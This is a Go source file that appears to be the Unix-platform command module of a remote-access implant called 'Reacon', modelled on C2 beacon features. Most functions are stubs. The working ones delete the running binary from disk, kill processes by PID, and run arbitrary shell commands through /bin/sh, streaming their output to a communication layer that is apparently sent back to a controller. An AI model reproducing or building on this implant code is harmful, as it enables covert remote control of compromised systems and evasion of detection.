package commands

import (
	"Reacon/pkg/communication"
	"errors"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func HideConsole() error {
	//return errors.New("this platform not supports HideConsole now.")
	return nil
}
func SetProcessDPIAware() error {
	//return errors.New("SetProcessDPIAware is not supported on this platform now.")
	return nil
}
func FullUnhook() error {
	return nil
}
func Run(b []byte) ([]byte, error) {
	return nil, nil
}
func DeleteSelf() ([]byte, error) {
	filename, err := os.Executable()
	if err != nil {
		return nil, err
	}
	Path := strings.ReplaceAll(string(filename), "\\", "/")
	err = os.RemoveAll(Path)
	if err != nil {
		return nil, errors.New("Remove failed")
	}
	return []byte("Remove " + string(filename) + " success"), nil
}
func KillProcess(pid uint32) ([]byte, error) {
	err := syscall.Kill(int(pid), 15)
	if err != nil {
		return nil, errors.New("process" + strconv.Itoa(int(pid)) + "not found")
	}
	return []byte("kill " + strconv.Itoa(int(pid)) + " success"), nil
}
func Drives() ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}
func Shell(path string, args []byte) ([]byte, error) {
	path = "/bin/sh"
	argsArray := []string{"-c", string(args)}
	cmd := exec.Command(path, argsArray...)
	stdout, err := cmd.StdoutPipe()
	cmd.Stderr = cmd.Stdout
	if err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}
	if err = cmd.Start(); err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}

	var buf []byte
	var count int
	time.Sleep(500 * time.Millisecond)
	buf = make([]byte, 1024*50)
	count, err = stdout.Read(buf)
	communication.DataProcess(0, buf[:count])
	for {
		buf = make([]byte, 1024*50)
		count, err = stdout.Read(buf)
		if err != nil {
			break
		}
		communication.DataProcess(0, append([]byte("[+] "+string(path)+" "+string(args)+" :\n"), buf[:count]...))
		time.Sleep(5000 * time.Millisecond)
	}

	if err = cmd.Wait(); err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}

	return []byte("success"), nil

}
func Execute(b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}
func ExecuteAssembly(data []byte, args string) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}
func Inline_Bin(data []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}
